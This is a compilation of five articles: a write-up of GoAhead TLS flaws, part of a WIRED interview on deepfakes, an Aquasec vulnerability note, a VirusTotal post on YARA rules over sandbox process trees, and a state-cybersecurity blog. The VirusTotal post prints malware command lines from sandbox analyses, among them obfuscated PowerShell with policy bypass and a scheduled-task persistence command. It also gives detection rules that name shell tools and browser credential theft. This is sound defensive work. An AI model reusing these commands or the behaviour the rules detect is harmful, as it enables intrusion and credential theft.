Title: GoAhead TLS Flaws Allow Revoked Client Certificates and Enable Session Decryption
Context: 11 Real Stories: How Identity Exposure Unlocks Active Attack Paths Map cross-domain privilege escalation to sever breach routes at key choke points
Full Text:
The GoAhead embedded web server loaded a certificate revocation list into its default TLS backend but never turned revocation checking on, so a revoked client certificate could still pass login on affected setups.

The flaw is in builds that use the OpenSSL backend with mutual-TLS, where the server checks a client certificate and vice versa, and a revocation list is configured to block revoked certificates.

That is a setup an operator turns on deliberately; a default build does not. GoAhead 6.1.1, released to device makers on August 2, 2026, and publicly published on October 12, fixes it.

GoAhead is a small web server that device makers build into firmware to run management pages on routers, printers, gateways and industrial controllers. Its maker, EmbedThis, says it runs in hundreds of millions of devices.

The flaw was found by Sébastien Féry of FoxIO, who described it and two other TLS problems in a write-up on October 26.

On an affected build, the server loads the revocation list file at startup and reports no error, so an operator who configured it has every reason to think revocation is working. It is not. A client whose certificate was revoked, for example a stolen or retired device, completes the handshake as if the certificate were still valid and gets whatever access that identity allows.

In FoxIO's test against GoAhead 6.1.0 with OpenSSL 3.6.2, a revoked certificate was accepted with issuer checking switched on.

The OpenSSL advisory describes revoked client certificates as silently accepted. To be exploited, the build must use the OpenSSL backend with client certificates required, a trusted certificate authority bundle and issuer checking enabled, and a revocation list configured; the attacker must hold a certificate signed by a trusted authority and listed as revoked. Builds that use the Mbed TLS backend are unaffected; that backend checks revocation via a separate code path.

The identifier on the advisory is CVE-2026-115881, rated 9.1 by EmbedThis. As of October 27, that identifier and the others below were not yet live in the public CVE and NVD databases; EmbedThis says it has requested them. The severity ratings are the vendor's own.

Researchers cover two further problems, each tied to a specific TLS build. The versions and fixes differ, so the table below maps each by backend.

TLS build

What goes wrong

Affected versions

Fix or interim option

OpenSSL (default)

Revocation list loaded but never enforced; revoked client certificates accepted. CVE-2026-115881, rated 9.1.

3.4.5 through 6.1.0

Upgrade to 6.1.1. No interim option in the advisory.

LibreSSL legacy verifier (3.2.x, 3.3.2–3.3.6)

A client certificate chain longer than the limit is accepted when client certificates are required but issuer checking is off. CVE-2026-115884, rated 7.4.

6.1.0 and earlier on those LibreSSL versions

Upgrade to 6.1.1, or turn issuer checking on with a trusted CA bundle, or use OpenSSL or LibreSSL 4.x.

Mbed TLS

A length typo sends a 1-byte Diffie-Hellman value instead of the full 2048-bit one, so a passive observer can decrypt the session. Rated 5.9. No CVE assigned.

4.0.2 through 6.1.0

Upgrade to 6.1.1, turn off finite-field DHE suites, or use the OpenSSL backend.

The Mbed TLS problem only reaches a session if the client accepts the broken setup. OpenSSL, current Go, current Java, and mainstream browsers refuse a value that small and fall back to a stronger key exchange, so the session never completes.

Clients without a minimum-size check, such as some embedded or custom ones, accept it, and then anyone who recorded the traffic can work out the key and read the session. TLS 1.3 and ECDHE sessions are unaffected, and Mbed TLS 4.x removed the key exchange they rely on.

The LibreSSL problem allows an attacker to present a certificate chain longer than GoAhead's 10-certificate limit and still complete the handshake as an authenticated client, without any trusted key.

It appears only on builds linked against the older LibreSSL versions listed above and only where client certificates are required with issuer checking off. OpenSSL, BoringSSL, AWS-LC and LibreSSL 4.x reject the over-long chain.

Which backend and settings a build uses are chosen when the firmware is compiled, so a device owner cannot tell from the outside which apply. That is also why the fix is slow to arrive: GoAhead 6.1.1 is a drop-in replacement that device makers rebuild and ship as a firmware update, and an owner gets it only when their manufacturer does so. Whether any manufacturer has shipped it is not known.

As of October 27, no source reported any of these problems being used in attacks. EmbedThis's policy is to end a disclosure embargo and publish early if a flaw is being exploited or disclosed by someone else, so the coordinated October 12 release is consistent with no known attacks.

However, it does not prove there are none. EmbedThis notifies customers of security updates through its Builder portal. FoxIO has published proof-of-concept code and offers fingerprints through its JA4Scan tool to find GoAhead servers by backend. The tool is free, but its source is available only on request, and a fingerprint identifies a build, not a confirmed-vulnerable server.

None of the device makers EmbedThis lists as GoAhead users, which include HP, Oracle, Siemens, Canon, Rockwell, D-Link and Comcast, has been shown to run an affected backend and setting. The affected population is not established.

The same 6.1.1 release closes 11 advisories in all, three of them rated critical. One is a login bypass: on a build using HTTP Basic or form login, an attacker who knows a valid username can sign in with any password if that user's stored password is in the newer Blowfish format, which GoAhead added in version 6.1.0. EmbedThis says form login is the default for its built-in administration pages.

After upgrading, EmbedThis recommends ending active sessions, restarting the server, and changing Blowfish-stored passwords.

Title: UK Politician Jess Asato Got Deepfaked. Now She’s Taking xAI to Court
Context: Then, after calling out Elon Musk during the notorious Grok Deepfake Scandal of 2025, Asato found herself caught in the very crisis she had been trying to prevent
Full Text:
Few people understand the current deepfake epidemic better than Jess Asato. The British Labour MP has spent years campaigning against the use of technology to abuse women and girls. Then, after calling out Elon Musk during the notorious Grok Deepfake Scandal of 2025, Asato found herself caught in the very crisis she had been trying to prevent.

Disturbing and degrading deepfake images of the MP circulated widely. One appeared to depict a sexual assault. When Asato reported them to X, the platform repeatedly dismissed her complaints. So she decided to take the fight somewhere else: the courts. She is now pursuing legal action against Musk’s xAI, arguing that it unlawfully used her image without her consent. The case could help establish a precedent for holding AI companies accountable when their products cause harm.

For Asato, this is personal, but it is hardly new territory. Before entering Parliament, she spent years working with charities supporting survivors of domestic abuse and vulnerable children. That experience has shaped her political career, informing her push for stronger protections for women and children online. Now, she is confronting more troubling questions: What happens when the technology enabling abuse becomes ubiquitous, the platforms hosting it refuse to intervene, and the people targeted are left to fight back on their own?

At stake for Asato is more than the misuse of a single image. It is whether consent still means anything when AI can manufacture almost anything, and whether the companies building these tools can be made to answer for what they do. Asato is betting that the law can catch up with the technology. And she is prepared to take on Musk to find out. (xAI did not immediately respond to WIRED’s request for comment.)

Also, before you read on, be aware that this interview includes references to sexual assault and child sex abuse.

This interview has been edited for length and clarity.

ROSIE SWASH: Jess, I just want to have a couple of warm-up questions before we get into it. Tell us a bit about your background, how did you end up becoming MP for Lowestoft?

JESS ASATO: Sure. So, I grew up in East Anglia in Norfolk and Suffolk, and in a not very political family. I got the politics bug in 1997 when Tony Blair was talking about education, education, education. Having experienced it, I felt that we could be doing a lot better in our education system. So I joined the Labour Party and got involved with my local groups.

Title: HTTP2Shell Vulnerability: How Should Security Teams Assess and Reduce Exposure?
Context: Aqua Team October 27, 2026 Updated: October 29th, 2026 TL;DR: The HTTP2Shell vulnerability (CVE-2026-111497) is a critical flaw in Google’s Brotli decompression decoder that...
Full Text:
How is Aquasec addressing HTTP2Shell?

Aquasec has reviewed the impact of HTTP2Shell on its own components and confirmed that the affected Brotli library was present in certain Aquasec Enforcer images.

However, our security analysis determined that the vulnerable decoding functionality is not used by Enforcer components. The Enforcer does not decompress Brotli data, meaning the conditions required to exploit HTTP2Shell through the affected decoder are not present in the assessed Enforcer execution paths.

Our assessment included examination of both source code and released binaries to verify that the vulnerable decoder is not invoked during Enforcer operation.

Although the vulnerable library was not reachable through Enforcer functionality, we have released an updated Enforcer versions for both Update 47 and Update 45 LTS containing the corrected Brotli package.

Aquasec Enforcer 2022.4 U47 SP2 (2022.4.951.5) and 2022.4 U45 Enforcer LTS SP9 (2022.4.880.50) are now available. We recommend that customers upgrade to this release to remove the vulnerable dependency and address associated scanner findings.

Customers looking for additional information about affected versions, our technical assessment and upgrade guidance can refer to the Aquasec Support Knowledge Base and the U47 SP2 release documentation or the U45 Enforcer LTS SP9 release documentation

Title: Process trees in Livehunt: YARA rules that know who launched what
Context: For a lot of detections that is the whole point: PowerShell on its own is noise, PowerShell launched by mshta
Full Text:
Note: YARA-X v1.21.0 adds a parent_name field to the items in vt.behaviour.processes_list, and v1.22.0 adds ancestor_names. VirusTotal now fills that list for every sandbox report that includes a process tree, by flattening it. The result is one entry per process, and each entry knows the name of the process that created it and of the processes above it. Read the YARA-X blog.

If you have written Livehunt rules on top of sandbox behavior, you have probably used vt.behaviour.processes_created. It is a flat list of command lines. It tells you that mshta.exe ran and that powershell.exe ran, but not that one started the other. For a lot of detections that is the whole point: PowerShell on its own is noise, PowerShell launched by mshta.exe is not.

Our sandboxes have always recorded the full process tree. The problem was getting it into YARA, which has no recursive types. As of this month, every file with sandbox reports that reaches Livehunt carries vt.behaviour.processes_list: one entry per process, from every sandbox that ran the file, and each entry knows the name of its parent, the names of its ancestors, and the files it touched.

This post covers what is in each entry, what to keep in mind when writing rules against it, and five cases we worked through while preparing it, each with the rules we wrote and tested. Every case comes with at least one hash, so you can paste the rule in the Livehunt editor and test it yourself.

If you haven't read it yet, we recommend our earlier post It's all about the structure! Creating YARA rules by clicking. It shows how to open the Structure view of any file in the Livehunt editor and turn fields into rule conditions with a click, which is handy for everything that follows.

What each process entry carries

Field

Type

What it holds

name

string

The process, as the sandbox reports it. Usually the image path plus the command line.

parent_name

string

The name of the process that created this one. Empty for root processes and when the parent is unknown.

ancestor_names

array of strings

The names of its ancestors, nearest first: ancestor_names[0] is the parent (the same as parent_name), ancestor_names[1] the grandparent, and so on. Empty for root processes and when the parent is unknown.

process_id / parent_process_id

string

PIDs, as reported by the sandbox.

start_time / termination_time

integer

When the process started and ended, if known.

files_written

array of strings

Files this process created or modified.

files_opened

array of strings

Files this process opened.

files_deleted

array of strings

Files this process deleted.

files_copied[x].source / .destination

string

Files this process copied, when the sandbox attributes copies to a process.

The fields that change how you write rules are parent_name, ancestor_names and the per-process file lists. With them, "PowerShell wrote a .dll" becomes "the PowerShell that cmd.exe started wrote a .dll".

The simplest possible rule looks like this:

import "vt" rule cmd_spawns_schtasks_create { condition: for any p in vt.behaviour.processes_list : ( p.name icontains "schtasks" and p.name icontains "/create" and p.parent_name icontains "cmd.exe" ) }

Things to know before you write rules

Names are not normalized. Each sandbox writes process names its own way. CAPE gives the quoted command line, Zenbox prepends the image path to the command line, Tencent HABO gives only the executable name, and C2AE and Microsoft Sysinternals often leave environment variables unexpanded (%ComSpec% /c ...). Use icontains and match on the executable name, not on a full path with == or startswith.

Link processes by name, not by PID. A file is usually run by several sandboxes, and Livehunt puts all their processes in the same list. PID 1040 can be cmd.exe in one report and explorer.exe in another. To go more than one level up, use ancestor_names: it is built from each sandbox report on its own, so a chain never mixes processes from different sandboxes. For long chains, you can also climb by name: look for the entry whose name is equal to the parent_name you already have. Both strings come from the same sandbox report, so an exact == is safe there.

A practical workflow is to search first and write the rule second. Intelligence search already supports behavior_processes:"<command line>", which matches anywhere in the list with no hierarchy. It is a quick way to collect candidates. Then you write the rule with the parent condition, and test it against those hashes in the Livehunt editor.

Case 1: porting a Sigma rule, and what it misses

Sigma's Suspicious MSHTA Child Process (03cc0c25-389f-4bf8-b48d-11878079f1ca) is a good example of a detection that needs the parent. Stripped down, it says: the parent image ends with \mshta.exe and the child is a shell or a scripting host.

detection: selection_parent: ParentImage|endswith: '\mshta.exe' selection_child: - Image|endswith: - '\cmd.exe' - '\powershell.exe' - '\pwsh.exe' - '\wscript.exe' - '\cscript.exe' - '\sh.exe' - '\bash.exe' - '\reg.exe' - '\regsvr32.exe' - '\bitsadmin.exe' condition: all of selection*

The Livehunt version maps ParentImage to parent_name and Image to name:

import "vt" rule mshta_spawns_shell { meta: description = "Port of Sigma 03cc0c25 (Suspicious MSHTA Child Process)" condition: for any p in vt.behaviour.processes_list : ( p.parent_name icontains "mshta.exe" and ( p.name icontains "cmd.exe" or p.name icontains "powershell" or p.name icontains "pwsh" or p.name icontains "wscript" or p.name icontains "cscript" or p.name icontains "bash.exe" or p.name icontains "reg.exe" or p.name icontains "regsvr32" or p.name icontains "bitsadmin" ) ) }

One thing does not carry over. Sigma also checks OriginalFileName to catch renamed binaries, and sandbox process names have no equivalent. A renamed mshta.exe will get past this rule.

We tested it against d30a0a6c09f664446943d82982f0630e85c447cbe84be8a74b6db6d66effbe80, an Excel file named NOVI USD 44570.00 952PLA3262852510.xls (18/76, tagged cve-2017-0199). It matches. What is more interesting is the CAPE process tree behind the match:

Process

Parent

EXCEL.EXE "...\attachment.xls" /dde

Explorer.EXE

mshta.exe -Embedding

svchost.exe -k DcomLaunch -p

cmd.exe "/c POwERSHeLl.Exe ... -EX BypaSS -nOp -w 1 -ec ..."

mshta.exe -Embedding

POwERSHeLl.Exe ... -ec ...

cmd.exe

WScript.exe "...\AppData\Roaming\westingcostringforme.vbe"

POwERSHeLl.Exe

powershell.exe -nop -ep bypass -file "C:\Temp\XBRYINEZ.ps1"

WScript.exe

aspnet_compiler.exe

powershell.exe -file ...XBRYINEZ.ps1

Excel is not the parent of mshta.exe. The exploit has Office request an object through DCOM, so mshta.exe is started by the DCOM launcher service, and it shows up with -Embedding. A rule that looks for "Office spawns mshta" would never fire on this document. What we can do is walk one level up from the shell and check the grandparent:

import "vt" rule dcom_mshta_spawns_shell { condition: for any p in vt.behaviour.processes_list : ( (p.name icontains "cmd.exe" or p.name icontains "powershell") and p.parent_name icontains "mshta.exe" and p.ancestor_names[1] icontains "svchost.exe" and p.ancestor_names[1] icontains "dcomlaunch" ) }

The first entry of ancestor_names is always the parent, so ancestor_names[1] is the grandparent: the process that started mshta.exe. Without it, you need a second loop over the list to find the entry whose name is the shell's parent_name, and one more loop for every extra level.

The same rule matches other spreadsheets from the same wave, for example 8d249972358268b7a00e182e3f1ecf93ec8bbbee65d22ef4d8a3c382783c1cfa (PO#3302-20260520002.xls), 2d199776cc50b9ad548132105e95af86b29ec8ebca03895a7ddecde58587306b (Request Quotation.xls) and 7c8a3c8366b3106db56359e3defc654d365ce4de21d0a7b1fbad02fbb2aeae52. The rest of that chain shows up again in cases 4 and 5.

Case 2: a services.exe that is not, and the copies behind it

On a normal Windows system, services.exe is started by wininit.exe and by nothing else. A services.exe with any other parent deserves a look:

import "vt" rule fake_services_wrong_parent { condition: for any p in vt.behaviour.processes_list : ( p.name iendswith "\\services.exe" and p.parent_name != "" and not p.parent_name icontains "wininit.exe" ) }

The parent_name != "" check matters. In the reports we looked at, the real services.exe shows up as a root process with no parent, and we don't want those to match.

Our first version also covered lsass.exe. We tested it against 43 recent, clean, signed files, and it matched 19 of them. In those reports the sandbox records lsass.exe with services.exe as its parent. Whatever the reason, that is what the data says, so we dropped lsass.exe from the rule. The lesson is a general one: before encoding what the parent "should" be, check what the sandboxes actually report for clean files.

The rule matches fe8357febe314becf31510a7a2ecb0369e312ad58a448292f5f8a09075d7694c, a .NET executable (45/76) submitted as Cd5KK.exe. In the Jujubox report, Cd5KK.exe starts C:\Windows\System32\NlsLexicons0c1a\services.exe. That process writes two .vbs files to %TEMP% and runs each one with WScript.exe, and one of the scripts starts the fake services.exe again. The sample also launches one PowerShell per path to add Defender exclusions, and in the CAPE report it creates ONLOGON scheduled tasks through WMI, with wmiprvse.exe as the parent of schtasks.exe.

Where did the fake services.exe come from? Jujubox does not attribute file copies to a process, but it does report them at the summary level, in vt.behaviour.files_copied. Cd5KK.exe copied itself to eight places, each one with the name of a Windows binary:

C:\Windows\System32\NlsLexicons0c1a\services.exe C:\System Volume Information\services.exe C:\Windows\system\smss.exe C:\Windows\System32\mfc42\taskeng.exe C:\Users\Default User\WmiPrvSE.exe C:\Program Files\Common Files\System\ado\en-US\WmiPrvSE.exe C:\PerfLogs\Admin\sysmon.exe C:\Users\<USER>\Downloads\patchregistry\event-stream.exe

You can combine both fields. This rule looks for a copy named after a system process, and then for a process in the list that runs from exactly that path and has a parent:

import "vt" rule copy_with_system_name_is_executed { condition: for any c in vt.behaviour.files_copied : ( ( c.destination iendswith "\\services.exe" or c.destination iendswith "\\smss.exe" or c.destination iendswith "\\lsass.exe" or c.destination iendswith "\\csrss.exe" or c.destination iendswith "\\svchost.exe" or c.destination iendswith "\\wmiprvse.exe" or c.destination iendswith "\\taskhostw.exe" or c.destination iendswith "\\conhost.exe" ) and for any p in vt.behaviour.processes_list : ( p.name icontains c.destination and p.parent_name != "" ) ) }

The copy proves the file was planted, and the process entry proves it ran. We tested the rule against 30 recent files with a services.exe path in their Jujubox file activity: it matched 9 of them, among them 4930cc4e7e3e258bf2815793f0e5698bdd45adfae8e052bb1dc4c05c6689ade6, which shares the trojan.msil/basic label with Cd5KK.exe and also matches the services.exe parent rule above. It did not match any of the 43 clean files.

Case 3: headless consoles, renamed or not

conhost.exe --headless runs a console program without showing a window. Sigma has a rule that looks for --headless and powershell in the conhost.exe command line. With the parent available, we can ask a slightly different question: did a PowerShell process actually start with a headless console as its parent?

import "vt" rule headless_console_runs_powershell { condition: for any p in vt.behaviour.processes_list : ( (p.name icontains "powershell" or p.name icontains "pwsh") and p.parent_name icontains "--headless" ) }

A plain search shows why a rule on the command line alone gets noisy. behavior_processes:"conhost.exe --headless" fs:2026-09-01+ returned 947 files when we ran it. Part of that is legitimate software. Terminal emulators use pseudo-consoles, which start conhost.exe --headless --inheritcursor ... --server .... herdr.exe (c18555a6bb74cd021198b57d16b93b40e74e7d0f8f0c28a45f0a4cc22dea0f8b, 0/76) does exactly that, and the rule above does not match it, because that conhost.exe never starts a shell.

On the malicious side, 5c2ceaec797dfa79e81cde6d765898ee8102357e280fa322db6e5a4b0ce3fc4a is a Windows shortcut with a Korean-language lure about penalty guidelines for e-commerce law violations, named with a double .hwp.lnk extension (34/76). CAPE and Jujubox both show the same chain: opening the shortcut starts conhost.exe --headless powershell.exe -NoP -exec BYpass -w 1 -C $rukp = '...', and that console starts the PowerShell that runs the Base64 blob. The decoded script opens with a function called Invoke-EnvironmentCheck.

Notice that the rule checks for --headless in the parent, not for conhost.exe. That is deliberate. 77da8a02d71078564409863c358a544e981b9643c8f50c1daabc5d5d176e3c75 (42/76) drops a file called rhpmx63snl.exe into %APPDATA%\MicrosoftWorker_e08ec640d\. That file is 51bb5aeef2e48dd14fae764f80dc67f516df9914ea9c350329e229f6cea919a2, an unmodified Microsoft conhost.exe (original name CONHOST.EXE, 0/77) with a random name. It later runs as rhpmx63snl.exe --headless powershell.exe -w h -ep bypass -c & "...\xd24mgasgb4.exe". A rule that required conhost.exe in the parent would miss it. If you only want the renamed case, add not p.parent_name icontains "conhost".

Case 4: persistence that actually ran

Spotting schtasks /create is easy. Knowing whether the task did anything during the analysis is harder, and the process list can answer it. When a scheduled task fires, the new process has the Task Scheduler service as its parent (svchost.exe -k netsvcs -p -s Schedule, or taskeng.exe on older systems). If that process runs a file the sample wrote earlier, the persistence worked.

import "vt" rule task_scheduler_runs_dropped_file { condition: for any run in vt.behaviour.processes_list : ( ( run.parent_name icontains "-s schedule" or run.parent_name icontains "taskeng.exe" ) and for any dropper in vt.behaviour.processes_list : ( for any f in dropper.files_written : ( (f iendswith ".exe" or f iendswith ".dll" or f iendswith ".vbs" or f iendswith ".js" or f iendswith ".ps1" or f iendswith ".bat" or f iendswith ".cmd") and run.name icontains f ) ) ) }

This is the first rule in the post that uses files_written, and it uses it to link two processes that are not parent and child: the one that wrote the file, and the one the scheduler started from it.

Back to 77da8a02d71078564409863c358a544e981b9643c8f50c1daabc5d5d176e3c75. In the CAPE report, software.exe writes rhpmx63snl.exe and xd24mgasgb4.exe to %APPDATA%\MicrosoftWorker_e08ec640d\, and then runs:

schtasks.exe /create /sc minute /mo 1 /tn "AdobeSecurityManager" /tr "C:\Users\<USER>\AppData\Roaming\MicrosoftWorker_e08ec640d\rhpmx63snl.exe --headless powershell.exe -w h -ep bypass -c & '...\xd24mgasgb4.exe'"

When the task fires, the scheduler starts rhpmx63snl.exe (the renamed conhost.exe from case 3), which starts PowerShell, which starts xd24mgasgb4.exe. Every link in that sentence is a parent_name, and the rule matches. The whole chain is also in the ancestor_names of xd24mgasgb4.exe: the PowerShell, rhpmx63snl.exe, the Schedule service and services.exe.

Zenbox saw the same task fire, but reported rhpmx63snl.exe as a root process with no parent. That is fine: CAPE has the link, and the rule only needs one sandbox to see it. It also shows why you shouldn't write rules that need every sandbox to agree.

One more format issue we ran into. a549a6c8c01da1d03e8da663eec70997a5bd5207e665d8e23f6fa75804dafc06, a VBS file we use in the next case, also creates a task that fires during the VMRay analysis, with taskeng.exe as the parent. The rule misses it, because VMRay logged that command line with doubled backslashes (C:\\Users\\Public\\Downloads\\PoItWjNFjv.vbs), so the path in files_written is not a substring of the process name. When a rule should match and does not, check the raw strings first. Here ancestor_names gives a check that does not depend on how paths are written: the task runs wscript.exe with the dropped script, the script starts PowerShell, and taskeng.exe is among that PowerShell's ancestors. A PowerShell process with for any a in p.ancestor_names : (a icontains "taskeng.exe") catches it.

Case 5: .NET binaries reading browser credentials

Loaders often inject the final payload into a signed .NET Framework binary such as MSBuild.exe, RegAsm.exe, RegSvcs.exe, InstallUtil.exe or aspnet_compiler.exe. On their own, these processes are normal on a developer machine. Started by PowerShell or a scripting host, and writing temporary copies of browser credential databases, they are not.

import "vt" rule dotnet_lolbin_touches_browser_logins { condition: for any p in vt.behaviour.processes_list : ( ( p.name icontains "aspnet_compiler.exe" or p.name icontains "regasm.exe" or p.name icontains "regsvcs.exe" or p.name icontains "msbuild.exe" or p.name icontains "installutil.exe" or p.name icontains "addinprocess" ) and for any a in p.ancestor_names : ( a icontains "powershell" or a icontains "wscript" or a icontains "cscript" or a icontains "mshta" ) and for any f in p.files_written : ( f icontains "\\User Data\\" and (f icontains "\\Login Data" or f icontains "\\Web Data" or f icontains "\\Cookies") ) ) }

All three conditions apply to the same process: what it is, what is above it, and what it wrote. That is the difference from the flat fields. behaviour_files:"Login Data" together with behavior_processes:"MSBuild.exe" can match a file where those two things happened in unrelated processes.

The rule matches a549a6c8c01da1d03e8da663eec70997a5bd5207e665d8e23f6fa75804dafc06, a VBS file named RFQ_638O-0194RFQ26_202610070614034439RFQ.vbs (14/76). In the CAPE report, a hidden PowerShell that rebuilds its script from environment variables is started through WMI (its parent is wmiprvse.exe), and that PowerShell starts MSBuild.exe, which writes ...\Google\Chrome\User Data\Default\Login Data.tmp and the matching -wal and -shm files. It also matches the Excel file from case 1, d30a0a6c09f664446943d82982f0630e85c447cbe84be8a74b6db6d66effbe80, where the last process in the chain, aspnet_compiler.exe, writes the same files. In that file, the ancestor_names of aspnet_compiler.exe go all the way back to the exploit: the PowerShell running XBRYINEZ.ps1, WScript.exe, the obfuscated PowerShell, cmd.exe and mshta.exe -Embedding.

Checking the ancestors instead of only the parent matters in 2d199776cc50b9ad548132105e95af86b29ec8ebca03895a7ddecde58587306b, the Request Quotation.xls from case 1. There, the process that writes the Chrome and Edge Login Data and Web Data files is a second aspnet_compiler.exe, started with /stext by the first one. Its parent is aspnet_compiler.exe, so a rule that only looks at parent_name misses it, while the PowerShell and WScript.exe above it are its second and third ancestors. On the 420 malicious and 324 clean files we used to measure ancestor_names, this version matched 5 malicious files that the parent-only version missed, and none of the clean ones.

Testing the rules

Everything in this post was tested two ways. First, against the hashes above and against a set of clean files, using the Livehunt rule tester. The tester rebuilds the vt module for the hash you give it, so it works for files analyzed before these fields existed. Second, in a live Livehunt ruleset with all the rules. Within a few minutes of enabling it we were already getting notifications for mshta_spawns_shell, dcom_mshta_spawns_shell, task_scheduler_runs_dropped_file and others. The ancestor_names versions of the rules were also run with YARA-X 1.22.0 against the same hashes and 324 clean files.

Wrapping up

A command line tells you what ran. Its parent and ancestors tell you how it got there, and the files it wrote tell you what it left behind. Rules that join the two are harder for a sample to sidestep, because the operator would need to change the chain, not just the strings. Open the vt module view of any file you are investigating, find the processes_list entry that bothers you, and write the rule from there.

Happy hunting!

Title: Whole-of-state defense: How SLED agencies can secure critical infrastructure in the AI era
Context: The NASCIO-GDIT brief cites emerging threats such as automated reconnaissance, and it urges states to prepare for an increase in AI-enabled attacks on critical infrastructure,...
Full Text:
AI is widening the attack surface of the critical infrastructure facilities and services that state, local, and education (SLED) organizations run. In the final post of our Cybersecurity Awareness Month series, we explain how a whole-of-state security approach can help SLED agencies protect their critical infrastructure.

Key takeaways

Because cyber attackers prey on under-resourced targets, they often go after SLED organizations, especially those that operate critical infrastructure, including water systems, hospitals, mass transit, emergency services, and schools.

In the latest research from the National Association of State Chief Information Officers (NASCIO), nearly 90% of state CIOs rated cyberattacks on critical systems as a high concern.

AI expands the attack surface in two fundamental ways: SLED agencies and employees adopt AI tools and AI-built apps faster than security teams can authorize and inventory them, while attackers use AI automation to find weak points faster.

A whole-of-state cybersecurity approach treats state agencies, counties, cities, school districts, and utilities as one defensive perimeter, with shared visibility, shared services, and clear governance.

Cyber attackers often look for the weakest link that can offer them an entry point into larger targets. If they can’t crack a state agency’s hardened systems, they’ll try to breach it in a roundabout way by first breaking into a small town’s water utility, a rural school district, or a county dispatch center, and then attempt to move laterally toward the bigger target.

When one of those weak links fails, the consequences can reach well beyond the breached agency: halted 911 dispatches, disrupted water service, exposed resident data, and more.

AI is further complicating the picture.

State, local, and education (SLED) organizations are adopting AI quickly to improve efficiency, employees are building applications with it informally, and adversaries are using it to speed up reconnaissance. Each of those developments is making it harder for security teams to protect SLED agencies.

In this fourth and final blog in our Cybersecurity Awareness Month series, we focus on what that expanding AI attack surface means for state, local, and education cybersecurity leaders responsible for critical infrastructure, and how whole-of-state cybersecurity can help them stay ahead.

Why SLED critical infrastructure is a prime target

SLED organizations operate critical infrastructure, such as water treatment plants, transportation systems, public hospitals, schools, and emergency communications, across many of the 16 critical infrastructure sectors categorized by the Cybersecurity and Infrastructure Security Agency (CISA).

State technology leaders are concerned about protecting these critical infrastructure facilities and services from cyber attacks, as “The Expanding Cyber Perimeter” report, published in September by the National Association of State Chief Information Officers (NASCIO) and General Dynamics Information Technology (GDIT), found.

Here are five key findings from the report, which drew on the 2026 NASCIO State CIO Survey, the 2026 NASCIO-Deloitte Cybersecurity Study, and interviews with state CISOs:

Nearly 90% of state CIOs rate cyber attacks on critical systems as a high concern. The rest rate them as moderate.

State CIOs report low confidence in local governments’ cyber practices. The report’s authors also say it’s unclear how states should help local governments and independent local government entities, like special districts.

Water and wastewater plants, dams, hospitals, and transportation services face the greatest cyber risk.

Many systems run on aging or proprietary operational technology (OT) with no upgrade path, and broad remote access increases their cyber risk.

Small communities and special districts often have limited cyber staff, aging equipment, and complex OT with few controls. With hundreds of such entities in a single state, attackers have plenty of entry points to try.

Responsibility is also murky. According to the NASCIO-GDIT report, it’s often unclear which agency is responsible for responding to an attack on critical infrastructure, especially where legal authority, governance, or partnerships aren’t in place.

Cyber risk extends beyond technical and geographical boundaries. When an attacker breaches systems of a county water utility or a school district, the incident can have widespread consequences.

State and local officials and their CIOs and CISOs should stop treating these incidents as one city’s or one county’s problem. Robert Beach, then CTO of the City of Cocoa, Florida, and a member of the Multi-State Information Sharing and Analysis Center (MS-ISAC) executive committee, told StateScoop last year that an attack on critical infrastructure “is an attack on the nation.”

Insiders add another layer of risk. Another MS-ISAC report, “Strengthening Critical Infrastructure: SLTT Progress & Priorities,” published in August 2025, flagged excessive access to system controls as a vulnerability. The report recommended agencies review who can reach their networks and disable credentials promptly when employees leave.

The 2026 NASCIO-Deloitte study underscores the risk, noting that attackers exploit compromised credentials and former employee accounts, so regular access reviews and prompt offboarding remain essential.

Recent cyber attacks against water systems have made the threat very real. On July 30, the Federal Bureau of Investigation (FBI) and the Environmental Protection Agency (EPA) warned that water and wastewater sector utilities in at least seven states had reported cyber attacks, leading in some cases to degraded water operations.

That same day, the CISA said it had observed “a significant increase in cyber threat actors targeting programmable logic controllers” in the water and wastewater sector.

“Threat actors targeting exposed PLCs have modified passwords to lock out operators and disconnected the PLCs by changing their IP addresses. This activity has resulted in boil water notices and sustained manual operations,” the CISA alert reads.

A week earlier, CISA and several federal agencies had published a joint advisory warning critical infrastructure organizations in the government, water, and energy sectors of “ongoing cyber exploitation of internet-connected OT devices.”

Tenable researchers recommend removing internet-exposed PLCs and setting their mode switches to “Run”, among other steps. The U.S. government is also tightening cybersecurity regulations for water and wastewater utilities.

Federal and state leaders are mobilizing, too.

In August, Texas Governor Greg Abbott, National Cyber Director Sean Cairncross, and Texas Cyber Command Chief Vice Admiral (Ret.) TJ White launched Project Watershed at a roundtable in San Antonio, Texas, which I was honored to attend. Project Watershed is a joint effort aimed at strengthening the cybersecurity of Texas water and wastewater systems against threats from hostile foreign adversaries.

Governor Abbott said that through the project, “our communities and water systems will be better secured from the onslaught of cyber-attacks.”

Protecting the water systems Americans rely on every day is a shared responsibility, and Project Watershed shows the kind of public-private collaboration a whole-of-state approach depends on.

How AI expands the attack surface

AI has moved from pilot project to operational reality in state government. NASCIO’s 2026 research shows AI overtaking cybersecurity as the top policy priority for state CIOs, the first time in more than a decade that cybersecurity loses the top spot.

AI adoption is good news for service delivery, but it also increases SLED agencies’ cyber risk. Three forces drive the rise in cyber risk:

Employees build and adopt AI tools on their own. As we covered earlier in this series, non-technical staff can now use AI tools to generate working applications using natural-language prompts, often without permission from the IT and security departments. In a government setting, those unsanctioned apps can access resident data, case management systems, and internal credentials, all without testing, patching, or monitoring.

AI shows up inside the software SLED agencies already own, as vendors quietly add AI features and connectors to their products, which can expand data access and permissions without the awareness of the IT and security teams.

Attackers use automation to move faster. The NASCIO-GDIT brief cites emerging threats such as automated reconnaissance, and it urges states to prepare for an increase in AI-enabled attacks on critical infrastructure, as the window between when an exposure appears and when attackers exploit it keeps shrinking.

For critical infrastructure operators, the stakes rise further. Their aging OT systems with broad remote access are already a soft target. Unvetted AI apps, over-permissioned connectors, and automated scanning by attackers quickly multiply the number of paths an attacker can chain together.

The key for SLED agency CISOs is to see their exposures across IT, OT, cloud, identity, and AI as one connected picture, and to prioritize and act on the ones an attacker could realistically exploit to reach systems that matter to public safety. An exposure management program can help SLED agencies address this cyber risk with comprehensive visibility, prioritization, and AI-assisted action.

What a whole-of-state approach looks like

A whole-of-state approach treats state agencies, local governments, schools, and utilities as one defensive perimeter instead of a collection of individual, siloed organizations.

The state government should share governance frameworks, visibility of IT/OT assets and security findings, and cybersecurity capabilities so the smallest entity doesn’t have to defend itself alone.

As Tenable’s Matt Kucik explains in the blog, “Whole-of-state cybersecurity: Uniting SLED agencies for maximum impact,” success starts with leadership and vision, open communication, and an actionable plan.

